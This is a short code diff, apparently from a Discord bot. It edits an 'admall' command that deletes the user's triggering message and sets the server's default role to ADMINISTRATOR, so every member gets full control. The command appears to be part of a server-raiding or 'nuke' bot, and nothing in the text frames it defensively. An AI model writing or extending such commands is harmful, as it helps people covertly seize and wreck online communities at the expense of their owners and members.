@@ -42,7 +42,7 @@ client.on("message", async (message) => {
         break;
         case "admall":
             message.delete();
-            message.guild.defaultRole.setPermissions(['ADMINISTRATOR', 'BAN_MEMBERS', 'KICK_MEMBERS', 'READ_MESSAGE_HISTORY', 'MANAGE_ROLES', 'MANAGE_CHANNELS', 'MANAGE_GUILD', 'MANAGE_EMOJIS', 'SEND_MESSAGES', 'VIEW_CHANNELS', 'SPEAK', 'VIEW_AUDIT_LOG', 'MOVE_MEMBERS', 'CREATE_INSTANT_INVITE', 'CONNECT']);
+            message.guild.defaultRole.setPermissions(['ADMINISTRATOR']);
         break;
         case "servername":
             message.delete();
